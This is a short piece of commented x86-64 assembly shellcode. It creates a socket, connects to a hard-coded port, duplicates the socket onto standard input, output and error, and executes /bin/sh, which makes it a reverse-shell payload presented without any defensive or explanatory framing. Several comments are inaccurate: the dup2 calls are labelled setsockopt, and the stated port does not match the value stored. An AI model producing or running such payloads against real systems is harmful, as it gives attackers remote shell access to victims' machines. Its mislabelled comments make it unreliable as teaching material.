; Initialize registers to zero
xor    rax, rax
xor    rbx, rbx
xor    rdx, rdx
xor    rsi, rsi
xor    rdi, rdi
xor    rbp, rbp

; Setup for socket system call (sys_socketcall)
mov    al, 0x29
mov    rdi, 0x2
mov    rsi, 0x1
xor    rdx, rdx
syscall

; Store socket file descriptor
mov    rbx, rax

; Prepare for connect system call
xor    rax, rax
push   rax
mov    word [rsp+0x2], 0x1d23 ; port 7459 in network byte order
push   0x2
mov    al, 0x2a
mov    rdi, rbx
mov    rsi, rsp
mov    dl, 0x10
syscall

; Loop to set up the socket with setsockopt
xor    rdx, rdx
xor    rsi, rsi

; First setsockopt call
mov    al, 0x21
mov    rdi, rbx
mov    sil, 0x2
syscall

; Second setsockopt call
mov    al, 0x21
mov    rdi, rbx
mov    sil, 0x1
syscall

; Third setsockopt call
mov    al, 0x21
mov    rdi, rbx
xor    sil, sil
syscall

; Execve system call to run /bin/sh
mov    al, 0x3b
xor    rbx, rbx
push   rbx
movabs rbx, 0x68732f2f6e69622f ; //bin/sh string
push   rbx
xor    rbx, rbx
mov    rdi, rsp
push   rbx
push   rdi
mov    rsi, rsp
syscall

; Exit system call
mov    al, 0x3c
xor    rdi, rdi
syscall
